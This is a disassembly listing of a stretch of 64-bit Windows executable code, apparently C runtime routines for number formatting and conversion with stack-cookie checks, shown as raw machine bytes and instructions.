   14000ef78:	48 63 45 04          	movslq 0x4(%rbp),%rax
   14000ef7c:	48 03 f8             	add    %rax,%rdi
   14000ef7f:	45 85 f6             	test   %r14d,%r14d
   14000ef82:	7e 77                	jle    0x14000effb
   14000ef84:	48 8b cf             	mov    %rdi,%rcx
   14000ef87:	48 8d 77 01          	lea    0x1(%rdi),%rsi
   14000ef8b:	e8 c0 3b ff ff       	call   0x140002b50
   14000ef90:	48 8b d7             	mov    %rdi,%rdx
   14000ef93:	48 8b ce             	mov    %rsi,%rcx
   14000ef96:	4c 8d 40 01          	lea    0x1(%rax),%r8
   14000ef9a:	e8 81 32 ff ff       	call   0x140002220
   14000ef9f:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000efa4:	48 8b 88 f0 00 00 00 	mov    0xf0(%rax),%rcx
   14000efab:	48 8b 01             	mov    (%rcx),%rax
   14000efae:	8a 08                	mov    (%rax),%cl
   14000efb0:	88 0f                	mov    %cl,(%rdi)
   14000efb2:	8b 5d 04             	mov    0x4(%rbp),%ebx
   14000efb5:	85 db                	test   %ebx,%ebx
   14000efb7:	79 42                	jns    0x14000effb
   14000efb9:	f7 db                	neg    %ebx
   14000efbb:	80 7c 24 70 00       	cmpb   $0x0,0x70(%rsp)
   14000efc0:	75 0b                	jne    0x14000efcd
   14000efc2:	8b c3                	mov    %ebx,%eax
   14000efc4:	41 8b de             	mov    %r14d,%ebx
   14000efc7:	44 3b f0             	cmp    %eax,%r14d
   14000efca:	0f 4d d8             	cmovge %eax,%ebx
   14000efcd:	85 db                	test   %ebx,%ebx
   14000efcf:	74 1a                	je     0x14000efeb
   14000efd1:	48 8b ce             	mov    %rsi,%rcx
   14000efd4:	e8 77 3b ff ff       	call   0x140002b50
   14000efd9:	48 63 cb             	movslq %ebx,%rcx
   14000efdc:	48 8b d6             	mov    %rsi,%rdx
   14000efdf:	4c 8d 40 01          	lea    0x1(%rax),%r8
   14000efe3:	48 03 ce             	add    %rsi,%rcx
   14000efe6:	e8 35 32 ff ff       	call   0x140002220
   14000efeb:	4c 63 c3             	movslq %ebx,%r8
   14000efee:	ba 30 00 00 00       	mov    $0x30,%edx
   14000eff3:	48 8b ce             	mov    %rsi,%rcx
   14000eff6:	e8 a5 37 ff ff       	call   0x1400027a0
   14000effb:	33 db                	xor    %ebx,%ebx
   14000effd:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000f002:	74 0c                	je     0x14000f010
   14000f004:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000f009:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   14000f010:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000f015:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000f01a:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   14000f01f:	8b c3                	mov    %ebx,%eax
   14000f021:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000f026:	48 83 c4 40          	add    $0x40,%rsp
   14000f02a:	41 5e                	pop    %r14
   14000f02c:	c3                   	ret
   14000f02d:	cc                   	int3
   14000f02e:	cc                   	int3
   14000f02f:	cc                   	int3
   14000f030:	40 53                	rex push %rbx
   14000f032:	55                   	push   %rbp
   14000f033:	56                   	push   %rsi
   14000f034:	57                   	push   %rdi
   14000f035:	48 83 ec 78          	sub    $0x78,%rsp
   14000f039:	48 8b 05 c0 9f 00 00 	mov    0x9fc0(%rip),%rax        # 0x140019000
   14000f040:	48 33 c4             	xor    %rsp,%rax
   14000f043:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000f048:	48 8b 09             	mov    (%rcx),%rcx
   14000f04b:	49 8b d8             	mov    %r8,%rbx
   14000f04e:	48 8b fa             	mov    %rdx,%rdi
   14000f051:	41 8b f1             	mov    %r9d,%esi
   14000f054:	bd 16 00 00 00       	mov    $0x16,%ebp
   14000f059:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   14000f05e:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000f063:	44 8b cd             	mov    %ebp,%r9d
   14000f066:	e8 d1 08 00 00       	call   0x14000f93c
   14000f06b:	48 85 ff             	test   %rdi,%rdi
   14000f06e:	75 10                	jne    0x14000f080
   14000f070:	e8 03 55 ff ff       	call   0x140004578
   14000f075:	89 28                	mov    %ebp,(%rax)
   14000f077:	e8 ac 50 ff ff       	call   0x140004128
   14000f07c:	8b c5                	mov    %ebp,%eax
   14000f07e:	eb 6b                	jmp    0x14000f0eb
   14000f080:	48 85 db             	test   %rbx,%rbx
   14000f083:	74 eb                	je     0x14000f070
   14000f085:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   14000f089:	48 3b da             	cmp    %rdx,%rbx
   14000f08c:	74 10                	je     0x14000f09e
   14000f08e:	33 c0                	xor    %eax,%eax
   14000f090:	83 7c 24 30 2d       	cmpl   $0x2d,0x30(%rsp)
   14000f095:	48 8b d3             	mov    %rbx,%rdx
   14000f098:	0f 94 c0             	sete   %al
   14000f09b:	48 2b d0             	sub    %rax,%rdx
   14000f09e:	44 8b 44 24 34       	mov    0x34(%rsp),%r8d
   14000f0a3:	33 c9                	xor    %ecx,%ecx
   14000f0a5:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000f0aa:	44 03 c6             	add    %esi,%r8d
   14000f0ad:	83 7c 24 30 2d       	cmpl   $0x2d,0x30(%rsp)
   14000f0b2:	0f 94 c1             	sete   %cl
   14000f0b5:	48 03 cf             	add    %rdi,%rcx
   14000f0b8:	e8 e3 06 00 00       	call   0x14000f7a0
   14000f0bd:	85 c0                	test   %eax,%eax
   14000f0bf:	74 05                	je     0x14000f0c6
   14000f0c1:	c6 07 00             	movb   $0x0,(%rdi)
   14000f0c4:	eb 25                	jmp    0x14000f0eb
   14000f0c6:	48 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%rax
   14000f0cd:	00 
   14000f0ce:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000f0d3:	44 8b c6             	mov    %esi,%r8d
   14000f0d6:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000f0db:	48 8b d3             	mov    %rbx,%rdx
   14000f0de:	48 8b cf             	mov    %rdi,%rcx
   14000f0e1:	c6 44 24 20 00       	movb   $0x0,0x20(%rsp)
   14000f0e6:	e8 e1 fd ff ff       	call   0x14000eecc
   14000f0eb:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   14000f0f0:	48 33 cc             	xor    %rsp,%rcx
   14000f0f3:	e8 48 41 ff ff       	call   0x140003240
   14000f0f8:	48 83 c4 78          	add    $0x78,%rsp
   14000f0fc:	5f                   	pop    %rdi
   14000f0fd:	5e                   	pop    %rsi
   14000f0fe:	5d                   	pop    %rbp
   14000f0ff:	5b                   	pop    %rbx
   14000f100:	c3                   	ret
   14000f101:	cc                   	int3
   14000f102:	cc                   	int3
   14000f103:	cc                   	int3
   14000f104:	40 53                	rex push %rbx
   14000f106:	55                   	push   %rbp
   14000f107:	56                   	push   %rsi
   14000f108:	57                   	push   %rdi
   14000f109:	41 56                	push   %r14
   14000f10b:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   14000f112:	48 8b 05 e7 9e 00 00 	mov    0x9ee7(%rip),%rax        # 0x140019000
   14000f119:	48 33 c4             	xor    %rsp,%rax
   14000f11c:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   14000f121:	48 8b 09             	mov    (%rcx),%rcx
   14000f124:	49 8b f8             	mov    %r8,%rdi
   14000f127:	48 8b f2             	mov    %rdx,%rsi
   14000f12a:	41 8b e9             	mov    %r9d,%ebp
   14000f12d:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000f132:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   14000f137:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000f13c:	44 8b cb             	mov    %ebx,%r9d
   14000f13f:	e8 f8 07 00 00       	call   0x14000f93c
   14000f144:	48 85 f6             	test   %rsi,%rsi
   14000f147:	75 13                	jne    0x14000f15c
   14000f149:	e8 2a 54 ff ff       	call   0x140004578
   14000f14e:	89 18                	mov    %ebx,(%rax)
   14000f150:	e8 d3 4f ff ff       	call   0x140004128
   14000f155:	8b c3                	mov    %ebx,%eax
   14000f157:	e9 c1 00 00 00       	jmp    0x14000f21d
   14000f15c:	48 85 ff             	test   %rdi,%rdi
   14000f15f:	74 e8                	je     0x14000f149
   14000f161:	44 8b 74 24 44       	mov    0x44(%rsp),%r14d
   14000f166:	33 c0                	xor    %eax,%eax
   14000f168:	41 ff ce             	dec    %r14d
   14000f16b:	83 7c 24 40 2d       	cmpl   $0x2d,0x40(%rsp)
   14000f170:	0f 94 c0             	sete   %al
   14000f173:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   14000f177:	48 8d 1c 30          	lea    (%rax,%rsi,1),%rbx
   14000f17b:	48 3b fa             	cmp    %rdx,%rdi
   14000f17e:	74 06                	je     0x14000f186
   14000f180:	48 8b d7             	mov    %rdi,%rdx
   14000f183:	48 2b d0             	sub    %rax,%rdx
   14000f186:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000f18b:	44 8b c5             	mov    %ebp,%r8d
   14000f18e:	48 8b cb             	mov    %rbx,%rcx
   14000f191:	e8 0a 06 00 00       	call   0x14000f7a0
   14000f196:	85 c0                	test   %eax,%eax
   14000f198:	74 05                	je     0x14000f19f
   14000f19a:	c6 06 00             	movb   $0x0,(%rsi)
   14000f19d:	eb 7e                	jmp    0x14000f21d
   14000f19f:	8b 44 24 44          	mov    0x44(%rsp),%eax
   14000f1a3:	ff c8                	dec    %eax
   14000f1a5:	44 3b f0             	cmp    %eax,%r14d
   14000f1a8:	0f 9c c1             	setl   %cl
   14000f1ab:	83 f8 fc             	cmp    $0xfffffffc,%eax
   14000f1ae:	7c 3b                	jl     0x14000f1eb
   14000f1b0:	3b c5                	cmp    %ebp,%eax
   14000f1b2:	7d 37                	jge    0x14000f1eb
   14000f1b4:	84 c9                	test   %cl,%cl
   14000f1b6:	74 0c                	je     0x14000f1c4
   14000f1b8:	8a 03                	mov    (%rbx),%al
   14000f1ba:	48 ff c3             	inc    %rbx
   14000f1bd:	84 c0                	test   %al,%al
   14000f1bf:	75 f7                	jne    0x14000f1b8
   14000f1c1:	88 43 fe             	mov    %al,-0x2(%rbx)
   14000f1c4:	48 8b 84 24 d8 00 00 	mov    0xd8(%rsp),%rax
   14000f1cb:	00 
   14000f1cc:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000f1d1:	44 8b c5             	mov    %ebp,%r8d
   14000f1d4:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000f1d9:	48 8b d7             	mov    %rdi,%rdx
   14000f1dc:	48 8b ce             	mov    %rsi,%rcx
   14000f1df:	c6 44 24 20 01       	movb   $0x1,0x20(%rsp)
   14000f1e4:	e8 e3 fc ff ff       	call   0x14000eecc
   14000f1e9:	eb 32                	jmp    0x14000f21d
   14000f1eb:	48 8b 84 24 d8 00 00 	mov    0xd8(%rsp),%rax
   14000f1f2:	00 
   14000f1f3:	44 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%r9d
   14000f1fa:	00 
   14000f1fb:	44 8b c5             	mov    %ebp,%r8d
   14000f1fe:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000f203:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000f208:	48 8b d7             	mov    %rdi,%rdx
   14000f20b:	48 8b ce             	mov    %rsi,%rcx
   14000f20e:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   14000f213:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000f218:	e8 bb f9 ff ff       	call   0x14000ebd8
   14000f21d:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   14000f222:	48 33 cc             	xor    %rsp,%rcx
   14000f225:	e8 16 40 ff ff       	call   0x140003240
   14000f22a:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   14000f231:	41 5e                	pop    %r14
   14000f233:	5f                   	pop    %rdi
   14000f234:	5e                   	pop    %rsi
   14000f235:	5d                   	pop    %rbp
   14000f236:	5b                   	pop    %rbx
   14000f237:	c3                   	ret
   14000f238:	33 d2                	xor    %edx,%edx
   14000f23a:	e9 01 00 00 00       	jmp    0x14000f240
   14000f23f:	cc                   	int3
   14000f240:	40 53                	rex push %rbx
   14000f242:	48 83 ec 40          	sub    $0x40,%rsp
   14000f246:	48 8b d9             	mov    %rcx,%rbx
   14000f249:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000f24e:	e8 e9 5c ff ff       	call   0x140004f3c
   14000f253:	8a 0b                	mov    (%rbx),%cl
   14000f255:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   14000f25a:	84 c9                	test   %cl,%cl
   14000f25c:	74 19                	je     0x14000f277
   14000f25e:	49 8b 80 f0 00 00 00 	mov    0xf0(%r8),%rax
   14000f265:	48 8b 10             	mov    (%rax),%rdx
   14000f268:	8a 02                	mov    (%rdx),%al
   14000f26a:	3a c8                	cmp    %al,%cl
   14000f26c:	74 09                	je     0x14000f277
   14000f26e:	48 ff c3             	inc    %rbx
   14000f271:	8a 0b                	mov    (%rbx),%cl
   14000f273:	84 c9                	test   %cl,%cl
   14000f275:	75 f3                	jne    0x14000f26a
   14000f277:	8a 03                	mov    (%rbx),%al
   14000f279:	48 ff c3             	inc    %rbx
   14000f27c:	84 c0                	test   %al,%al
   14000f27e:	74 3d                	je     0x14000f2bd
   14000f280:	eb 09                	jmp    0x14000f28b
   14000f282:	2c 45                	sub    $0x45,%al
   14000f284:	a8 df                	test   $0xdf,%al
   14000f286:	74 09                	je     0x14000f291
   14000f288:	48 ff c3             	inc    %rbx
   14000f28b:	8a 03                	mov    (%rbx),%al
   14000f28d:	84 c0                	test   %al,%al
   14000f28f:	75 f1                	jne    0x14000f282
   14000f291:	48 8b d3             	mov    %rbx,%rdx
   14000f294:	48 ff cb             	dec    %rbx
   14000f297:	80 3b 30             	cmpb   $0x30,(%rbx)
   14000f29a:	74 f8                	je     0x14000f294
   14000f29c:	49 8b 80 f0 00 00 00 	mov    0xf0(%r8),%rax
   14000f2a3:	48 8b 08             	mov    (%rax),%rcx
   14000f2a6:	8a 01                	mov    (%rcx),%al
   14000f2a8:	38 03                	cmp    %al,(%rbx)
   14000f2aa:	75 03                	jne    0x14000f2af
   14000f2ac:	48 ff cb             	dec    %rbx
   14000f2af:	8a 02                	mov    (%rdx),%al
   14000f2b1:	48 ff c3             	inc    %rbx
   14000f2b4:	48 ff c2             	inc    %rdx
   14000f2b7:	88 03                	mov    %al,(%rbx)
   14000f2b9:	84 c0                	test   %al,%al
   14000f2bb:	75 f2                	jne    0x14000f2af
   14000f2bd:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000f2c2:	74 0c                	je     0x14000f2d0
   14000f2c4:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000f2c9:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   14000f2d0:	48 83 c4 40          	add    $0x40,%rsp
   14000f2d4:	5b                   	pop    %rbx
   14000f2d5:	c3                   	ret
   14000f2d6:	cc                   	int3
   14000f2d7:	cc                   	int3
   14000f2d8:	45 33 c9             	xor    %r9d,%r9d
   14000f2db:	e9 00 00 00 00       	jmp    0x14000f2e0
   14000f2e0:	40 53                	rex push %rbx
   14000f2e2:	48 83 ec 30          	sub    $0x30,%rsp
   14000f2e6:	49 8b c0             	mov    %r8,%rax
   14000f2e9:	48 8b da             	mov    %rdx,%rbx
   14000f2ec:	4d 8b c1             	mov    %r9,%r8
   14000f2ef:	48 8b d0             	mov    %rax,%rdx
   14000f2f2:	85 c9                	test   %ecx,%ecx
   14000f2f4:	74 14                	je     0x14000f30a
   14000f2f6:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000f2fb:	e8 48 df ff ff       	call   0x14000d248
   14000f300:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000f305:	48 89 03             	mov    %rax,(%rbx)
   14000f308:	eb 10                	jmp    0x14000f31a
   14000f30a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000f30f:	e8 fc df ff ff       	call   0x14000d310
   14000f314:	8b 44 24 40          	mov    0x40(%rsp),%eax
   14000f318:	89 03                	mov    %eax,(%rbx)
   14000f31a:	48 83 c4 30          	add    $0x30,%rsp
   14000f31e:	5b                   	pop    %rbx
   14000f31f:	c3                   	ret
   14000f320:	33 d2                	xor    %edx,%edx
   14000f322:	e9 01 00 00 00       	jmp    0x14000f328
   14000f327:	cc                   	int3
   14000f328:	40 53                	rex push %rbx
   14000f32a:	48 83 ec 40          	sub    $0x40,%rsp
   14000f32e:	48 8b d9             	mov    %rcx,%rbx
   14000f331:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000f336:	e8 01 5c ff ff       	call   0x140004f3c
   14000f33b:	0f be 0b             	movsbl (%rbx),%ecx
   14000f33e:	e8 19 dc ff ff       	call   0x14000cf5c
   14000f343:	83 f8 65             	cmp    $0x65,%eax
   14000f346:	74 0f                	je     0x14000f357
   14000f348:	48 ff c3             	inc    %rbx
   14000f34b:	0f b6 0b             	movzbl (%rbx),%ecx
   14000f34e:	e8 8d 02 00 00       	call   0x14000f5e0
   14000f353:	85 c0                	test   %eax,%eax
   14000f355:	75 f1                	jne    0x14000f348
   14000f357:	0f be 0b             	movsbl (%rbx),%ecx
   14000f35a:	e8 fd db ff ff       	call   0x14000cf5c
   14000f35f:	83 f8 78             	cmp    $0x78,%eax
   14000f362:	75 04                	jne    0x14000f368
   14000f364:	48 83 c3 02          	add    $0x2,%rbx
   14000f368:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000f36d:	8a 13                	mov    (%rbx),%dl
   14000f36f:	48 8b 88 f0 00 00 00 	mov    0xf0(%rax),%rcx
   14000f376:	48 8b 01             	mov    (%rcx),%rax
   14000f379:	8a 08                	mov    (%rax),%cl
   14000f37b:	88 0b                	mov    %cl,(%rbx)
   14000f37d:	48 ff c3             	inc    %rbx
   14000f380:	8a 03                	mov    (%rbx),%al
   14000f382:	88 13                	mov    %dl,(%rbx)
   14000f384:	8a d0                	mov    %al,%dl
   14000f386:	8a 03                	mov    (%rbx),%al
   14000f388:	48 ff c3             	inc    %rbx
   14000f38b:	84 c0                	test   %al,%al
   14000f38d:	75 f1                	jne    0x14000f380
   14000f38f:	38 44 24 38          	cmp    %al,0x38(%rsp)
   14000f393:	74 0c                	je     0x14000f3a1
   14000f395:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000f39a:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   14000f3a1:	48 83 c4 40          	add    $0x40,%rsp
   14000f3a5:	5b                   	pop    %rbx
   14000f3a6:	c3                   	ret
   14000f3a7:	cc                   	int3
   14000f3a8:	f2 0f 10 01          	movsd  (%rcx),%xmm0
   14000f3ac:	33 c0                	xor    %eax,%eax
   14000f3ae:	66 0f 2f 05 f2 7c 00 	comisd 0x7cf2(%rip),%xmm0        # 0x1400170a8
   14000f3b5:	00 
   14000f3b6:	0f 93 c0             	setae  %al
   14000f3b9:	c3                   	ret
   14000f3ba:	cc                   	int3
   14000f3bb:	cc                   	int3
   14000f3bc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000f3c1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000f3c6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000f3cb:	57                   	push   %rdi
   14000f3cc:	41 54                	push   %r12
   14000f3ce:	41 56                	push   %r14
   14000f3d0:	48 83 ec 10          	sub    $0x10,%rsp
   14000f3d4:	41 83 20 00          	andl   $0x0,(%r8)
   14000f3d8:	41 83 60 04 00       	andl   $0x0,0x4(%r8)
   14000f3dd:	41 83 60 08 00       	andl   $0x0,0x8(%r8)
   14000f3e2:	4d 8b d0             	mov    %r8,%r10
   14000f3e5:	8b fa                	mov    %edx,%edi
   14000f3e7:	48 8b e9             	mov    %rcx,%rbp
   14000f3ea:	bb 4e 40 00 00       	mov    $0x404e,%ebx
   14000f3ef:	85 d2                	test   %edx,%edx
   14000f3f1:	0f 84 41 01 00 00    	je     0x14000f538
   14000f3f7:	45 33 db             	xor    %r11d,%r11d
   14000f3fa:	45 33 c0             	xor    %r8d,%r8d
   14000f3fd:	45 33 c9             	xor    %r9d,%r9d
   14000f400:	45 8d 63 01          	lea    0x1(%r11),%r12d
   14000f404:	f2 41 0f 10 02       	movsd  (%r10),%xmm0
   14000f409:	45 8b 72 08          	mov    0x8(%r10),%r14d
   14000f40d:	41 8b c8             	mov    %r8d,%ecx
   14000f410:	c1 e9 1f             	shr    $0x1f,%ecx
   14000f413:	45 03 c0             	add    %r8d,%r8d
   14000f416:	45 03 c9             	add    %r9d,%r9d
   14000f419:	f2 0f 11 04 24       	movsd  %xmm0,(%rsp)
   14000f41e:	44 0b c9             	or     %ecx,%r9d
   14000f421:	43 8d 14 1b          	lea    (%r11,%r11,1),%edx
   14000f425:	41 8b c3             	mov    %r11d,%eax
   14000f428:	c1 e8 1f             	shr    $0x1f,%eax
   14000f42b:	45 03 c9             	add    %r9d,%r9d
   14000f42e:	44 0b c0             	or     %eax,%r8d
   14000f431:	8b c2                	mov    %edx,%eax
   14000f433:	03 d2                	add    %edx,%edx
   14000f435:	41 8b c8             	mov    %r8d,%ecx
   14000f438:	c1 e8 1f             	shr    $0x1f,%eax
   14000f43b:	45 03 c0             	add    %r8d,%r8d
   14000f43e:	c1 e9 1f             	shr    $0x1f,%ecx
   14000f441:	44 0b c0             	or     %eax,%r8d
   14000f444:	33 c0                	xor    %eax,%eax
   14000f446:	44 0b c9             	or     %ecx,%r9d
   14000f449:	8b 0c 24             	mov    (%rsp),%ecx
   14000f44c:	41 89 12             	mov    %edx,(%r10)
   14000f44f:	8d 34 0a             	lea    (%rdx,%rcx,1),%esi
   14000f452:	45 89 42 04          	mov    %r8d,0x4(%r10)
   14000f456:	45 89 4a 08          	mov    %r9d,0x8(%r10)
   14000f45a:	3b f2                	cmp    %edx,%esi
   14000f45c:	72 04                	jb     0x14000f462
   14000f45e:	3b f1                	cmp    %ecx,%esi
   14000f460:	73 03                	jae    0x14000f465
   14000f462:	41 8b c4             	mov    %r12d,%eax
   14000f465:	41 89 32             	mov    %esi,(%r10)
   14000f468:	85 c0                	test   %eax,%eax
   14000f46a:	74 24                	je     0x14000f490
   14000f46c:	41 8b c0             	mov    %r8d,%eax
   14000f46f:	41 ff c0             	inc    %r8d
   14000f472:	33 c9                	xor    %ecx,%ecx
   14000f474:	44 3b c0             	cmp    %eax,%r8d
   14000f477:	72 05                	jb     0x14000f47e
   14000f479:	45 3b c4             	cmp    %r12d,%r8d
   14000f47c:	73 03                	jae    0x14000f481
   14000f47e:	41 8b cc             	mov    %r12d,%ecx
   14000f481:	45 89 42 04          	mov    %r8d,0x4(%r10)
   14000f485:	85 c9                	test   %ecx,%ecx
   14000f487:	74 07                	je     0x14000f490
   14000f489:	41 ff c1             	inc    %r9d
   14000f48c:	45 89 4a 08          	mov    %r9d,0x8(%r10)
   14000f490:	48 8b 04 24          	mov    (%rsp),%rax
   14000f494:	33 c9                	xor    %ecx,%ecx
   14000f496:	48 c1 e8 20          	shr    $0x20,%rax
   14000f49a:	45 8d 1c 00          	lea    (%r8,%rax,1),%r11d
   14000f49e:	45 3b d8             	cmp    %r8d,%r11d
   14000f4a1:	72 05                	jb     0x14000f4a8
   14000f4a3:	44 3b d8             	cmp    %eax,%r11d
   14000f4a6:	73 03                	jae    0x14000f4ab
   14000f4a8:	41 8b cc             	mov    %r12d,%ecx
   14000f4ab:	45 89 5a 04          	mov    %r11d,0x4(%r10)
   14000f4af:	85 c9                	test   %ecx,%ecx
   14000f4b1:	74 07                	je     0x14000f4ba
   14000f4b3:	45 03 cc             	add    %r12d,%r9d
   14000f4b6:	45 89 4a 08          	mov    %r9d,0x8(%r10)
   14000f4ba:	45 03 ce             	add    %r14d,%r9d
   14000f4bd:	8d 14 36             	lea    (%rsi,%rsi,1),%edx
   14000f4c0:	41 8b cb             	mov    %r11d,%ecx
   14000f4c3:	c1 e9 1f             	shr    $0x1f,%ecx
   14000f4c6:	47 8d 04 1b          	lea    (%r11,%r11,1),%r8d
   14000f4ca:	45 03 c9             	add    %r9d,%r9d
   14000f4cd:	44 0b c9             	or     %ecx,%r9d
   14000f4d0:	8b c6                	mov    %esi,%eax
   14000f4d2:	41 89 12             	mov    %edx,(%r10)
   14000f4d5:	c1 e8 1f             	shr    $0x1f,%eax
   14000f4d8:	45 89 4a 08          	mov    %r9d,0x8(%r10)
   14000f4dc:	44 0b c0             	or     %eax,%r8d
   14000f4df:	33 c0                	xor    %eax,%eax
   14000f4e1:	45 89 42 04          	mov    %r8d,0x4(%r10)
   14000f4e5:	0f be 4d 00          	movsbl 0x0(%rbp),%ecx
   14000f4e9:	44 8d 1c 0a          	lea    (%rdx,%rcx,1),%r11d
   14000f4ed:	44 3b da             	cmp    %edx,%r11d
   14000f4f0:	72 05                	jb     0x14000f4f7
   14000f4f2:	44 3b d9             	cmp    %ecx,%r11d
   14000f4f5:	73 03                	jae    0x14000f4fa
   14000f4f7:	41 8b c4             	mov    %r12d,%eax
   14000f4fa:	45 89 1a             	mov    %r11d,(%r10)
   14000f4fd:	85 c0                	test   %eax,%eax
   14000f4ff:	74 24                	je     0x14000f525
   14000f501:	41 8b c0             	mov    %r8d,%eax
   14000f504:	41 ff c0             	inc    %r8d
   14000f507:	33 c9                	xor    %ecx,%ecx
   14000f509:	44 3b c0             	cmp    %eax,%r8d
   14000f50c:	72 05                	jb     0x14000f513
   14000f50e:	45 3b c4             	cmp    %r12d,%r8d
   14000f511:	73 03                	jae    0x14000f516
   14000f513:	41 8b cc             	mov    %r12d,%ecx
   14000f516:	45 89 42 04          	mov    %r8d,0x4(%r10)
   14000f51a:	85 c9                	test   %ecx,%ecx
   14000f51c:	74 07                	je     0x14000f525
   14000f51e:	41 ff c1             	inc    %r9d
   14000f521:	45 89 4a 08          	mov    %r9d,0x8(%r10)
   14000f525:	49 03 ec             	add    %r12,%rbp
   14000f528:	45 89 42 04          	mov    %r8d,0x4(%r10)
   14000f52c:	45 89 4a 08          	mov    %r9d,0x8(%r10)
   14000f530:	ff cf                	dec    %edi
   14000f532:	0f 85 cc fe ff ff    	jne    0x14000f404
   14000f538:	41 83 7a 08 00       	cmpl   $0x0,0x8(%r10)
   14000f53d:	75 3a                	jne    0x14000f579
   14000f53f:	45 8b 42 04          	mov    0x4(%r10),%r8d
   14000f543:	41 8b 12             	mov    (%r10),%edx
   14000f546:	41 8b c0             	mov    %r8d,%eax
   14000f549:	45 8b c8             	mov    %r8d,%r9d
   14000f54c:	c1 e0 10             	shl    $0x10,%eax
   14000f54f:	8b ca                	mov    %edx,%ecx
   14000f551:	c1 e2 10             	shl    $0x10,%edx
   14000f554:	c1 e9 10             	shr    $0x10,%ecx
   14000f557:	41 c1 e9 10          	shr    $0x10,%r9d
   14000f55b:	41 89 12             	mov    %edx,(%r10)
   14000f55e:	44 8b c1             	mov    %ecx,%r8d
   14000f561:	44 0b c0             	or     %eax,%r8d
   14000f564:	b8 f0 ff 00 00       	mov    $0xfff0,%eax
   14000f569:	66 03 d8             	add    %ax,%bx
   14000f56c:	45 85 c9             	test   %r9d,%r9d
   14000f56f:	74 d2                	je     0x14000f543
   14000f571:	45 89 42 04          	mov    %r8d,0x4(%r10)
   14000f575:	45 89 4a 08          	mov    %r9d,0x8(%r10)
   14000f579:	41 8b 52 08          	mov    0x8(%r10),%edx
   14000f57d:	41 bb 00 80 00 00    	mov    $0x8000,%r11d
   14000f583:	41 85 d3             	test   %edx,%r11d
   14000f586:	75 38                	jne    0x14000f5c0
   14000f588:	45 8b 0a             	mov    (%r10),%r9d
   14000f58b:	45 8b 42 04          	mov    0x4(%r10),%r8d
   14000f58f:	41 8b c8             	mov    %r8d,%ecx
   14000f592:	41 8b c1             	mov    %r9d,%eax
   14000f595:	45 03 c0             	add    %r8d,%r8d
   14000f598:	c1 e8 1f             	shr    $0x1f,%eax
   14000f59b:	03 d2                	add    %edx,%edx
   14000f59d:	c1 e9 1f             	shr    $0x1f,%ecx
   14000f5a0:	44 0b c0             	or     %eax,%r8d
   14000f5a3:	b8 ff ff 00 00       	mov    $0xffff,%eax
   14000f5a8:	0b d1                	or     %ecx,%edx
   14000f5aa:	66 03 d8             	add    %ax,%bx
   14000f5ad:	45 03 c9             	add    %r9d,%r9d
   14000f5b0:	41 85 d3             	test   %edx,%r11d
   14000f5b3:	74 da                	je     0x14000f58f
   14000f5b5:	45 89 0a             	mov    %r9d,(%r10)
   14000f5b8:	45 89 42 04          	mov    %r8d,0x4(%r10)
   14000f5bc:	41 89 52 08          	mov    %edx,0x8(%r10)
   14000f5c0:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000f5c5:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000f5ca:	66 41 89 5a 0a       	mov    %bx,0xa(%r10)
   14000f5cf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000f5d4:	48 83 c4 10          	add    $0x10,%rsp
   14000f5d8:	41 5e                	pop    %r14
   14000f5da:	41 5c                	pop    %r12
   14000f5dc:	5f                   	pop    %rdi
   14000f5dd:	c3                   	ret
   14000f5de:	cc                   	int3
   14000f5df:	cc                   	int3
   14000f5e0:	40 53                	rex push %rbx
   14000f5e2:	48 83 ec 40          	sub    $0x40,%rsp
